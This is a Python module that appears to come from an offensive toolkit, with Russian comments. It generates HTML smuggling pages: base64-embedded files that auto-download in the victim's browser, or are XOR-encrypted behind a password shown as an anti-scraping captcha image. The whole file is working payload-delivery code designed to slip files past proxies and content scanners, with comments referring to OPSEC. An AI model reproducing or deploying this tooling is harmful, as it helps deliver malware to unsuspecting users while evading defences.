"""
HTML Smuggling - генерация HTML страниц для скачивания файлов.
"""

import base64
import hashlib


def xor_encrypt(data: bytes, password: str) -> bytes:
    """
    XOR шифрование с ключом из SHA256 пароля.

    ВНИМАНИЕ: Эта реализация намеренно отличается от security/crypto.py!
    - security/crypto.py: XOR с raw паролем (для серверного шифрования/OPSEC)
    - utils/smuggling.py: XOR с SHA256(password) (для HTML Smuggling / браузера)

    Браузерный JavaScript (CryptoJS.SHA256) использует SHA256-derived key,
    поэтому серверная сторона HTML Smuggling должна делать то же самое.
    Не объединяйте эти реализации — они обслуживают разные протоколы.
    """
    key = hashlib.sha256(password.encode('utf-8')).digest()
    key_len = len(key)

    result = bytearray()
    for i, byte in enumerate(data):
        result.append(byte ^ key[i % key_len])

    return bytes(result)


def generate_smuggling_html(
    file_data: bytes,
    filename: str,
    password: str | None = None,
    password_captcha: str | None = None,
    crypto_js_src: str = "/static/crypto-js.min.js"
) -> str:
    """
    Генерация HTML страницы для HTML Smuggling.

    Args:
        file_data: Содержимое файла
        filename: Имя файла для скачивания
        password: Пароль для XOR шифрования (None = без шифрования)
        password_captcha: Base64 data URI капчи с паролем (опционально)
        crypto_js_src: Путь к crypto-js (нужен только при шифровании)

    Returns:
        HTML страница
    """
    if password:
        # Шифруем и кодируем в base64
        encrypted = xor_encrypt(file_data, password)
        data_b64 = base64.b64encode(encrypted).decode('utf-8')
        return _create_html_with_password(data_b64, filename, crypto_js_src, password_captcha, password)
    else:
        # Просто base64
        data_b64 = base64.b64encode(file_data).decode('utf-8')
        return _create_html_no_password(data_b64, filename)


def _create_html_no_password(base64_data: str, filename: str) -> str:
    """HTML без пароля - автоматическое скачивание."""
    return f'''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Download</title>
<style>
body{{font-family:Arial,sans-serif;max-width:600px;margin:50px auto;padding:20px;text-align:center;background:#1a1a2e;color:#eee}}
h2{{color:#00d4ff}}
.status{{color:#888;margin:20px 0}}
</style>
</head>
<body>
<h2>Downloading...</h2>
<div class="status" id="s">Preparing file...</div>
<script>
var fn="{filename}";
var data="{base64_data}";
function d(){{
try{{
document.getElementById("s").textContent="Processing...";
var b=atob(data);
var a=new Uint8Array(b.length);
for(var i=0;i<b.length;i++)a[i]=b.charCodeAt(i);
var blob=new Blob([a],{{type:"application/octet-stream"}});
var url=window.URL.createObjectURL(blob);
var el=document.createElement("a");
el.href=url;
el.download=fn;
document.body.appendChild(el);
el.click();
document.body.removeChild(el);
window.URL.revokeObjectURL(url);
document.getElementById("s").innerHTML="Done! File: <b>"+fn+"</b>";
}}catch(e){{document.getElementById("s").textContent="Error: "+e.message}}
}}
setTimeout(d,500);
</script>
</body>
</html>'''


def _create_html_with_password(
    encrypted_data: str,
    filename: str,
    crypto_js_src: str,
    captcha_img: str | None = None,
    password: str | None = None
) -> str:
    """HTML с паролем - форма ввода пароля."""
    # Блок с капчей (если есть)
    captcha_block = ""
    if captcha_img:
        captcha_block = f'''
<div class="captcha-box">
<p class="captcha-label">Password:</p>
<img src="{captcha_img}" alt="Password" class="captcha-img" draggable="false" oncontextmenu="return false;">
</div>'''

    # Встроенная реализация SHA256 (без внешних зависимостей)
    return f'''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Protected Download</title>
<style>
body{{font-family:Arial,sans-serif;max-width:400px;margin:50px auto;padding:20px;background:#1a1a2e;color:#eee}}
h3{{color:#00d4ff;text-align:center}}
input{{width:100%;padding:12px;margin:10px 0;border:1px solid #30363d;border-radius:8px;box-sizing:border-box;background:#0d1117;color:#fff;font-size:1rem}}
input:focus{{outline:none;border-color:#00d4ff}}
button{{width:100%;padding:12px;background:#00d4ff;color:#000;border:none;border-radius:8px;cursor:pointer;font-size:1rem;font-weight:bold}}
button:hover{{background:#00b8e6}}
.msg{{color:#888;margin:15px 0;font-size:14px;text-align:center}}
.err{{color:#f87171}}
.ok{{color:#4ade80}}
.info{{color:#666;font-size:0.85rem;text-align:center;margin-top:20px}}
.captcha-box{{background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:15px;margin:15px 0;text-align:center}}
.captcha-label{{color:#888;font-size:0.85rem;margin:0 0 10px 0}}
.captcha-img{{max-width:100%;height:auto;border-radius:4px;user-select:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none}}
</style>
</head>
<body>
<h3>Protected File</h3>{captcha_block}
<p class="info">Enter password to download</p>
<input type="password" id="p" placeholder="Password" autofocus>
<button onclick="d()">Download</button>
<div class="msg" id="m"></div>
<script src="/static/crypto-js.min.js"></script>
<script>
var fn="{filename}";
var encData="{encrypted_data}";
function d(){{
var pw=document.getElementById("p").value;
if(!pw){{msg("Enter password","err");return}}
msg("Decrypting...","");
try{{
var hash=CryptoJS.SHA256(pw);
var key=[];
for(var i=0;i<hash.words.length;i++){{
var w=hash.words[i]>>>0;
key.push((w>>>24)&0xff);
key.push((w>>>16)&0xff);
key.push((w>>>8)&0xff);
key.push(w&0xff);
}}
var raw=atob(encData);
var dec=new Uint8Array(raw.length);
for(var i=0;i<raw.length;i++)dec[i]=raw.charCodeAt(i)^key[i%key.length];
var blob=new Blob([dec],{{type:"application/octet-stream"}});
var url=window.URL.createObjectURL(blob);
var el=document.createElement("a");
el.href=url;
el.download=fn;
document.body.appendChild(el);
el.click();
document.body.removeChild(el);
window.URL.revokeObjectURL(url);
msg("Downloaded: "+fn,"ok");
}}catch(e){{
msg("Error: "+e.message,"err");
}}
}}
function msg(t,c){{var m=document.getElementById("m");m.textContent=t;m.className="msg "+c}}
document.getElementById("p").addEventListener("keypress",function(e){{if(e.key==="Enter")d()}});
</script>
</body>
</html>'''
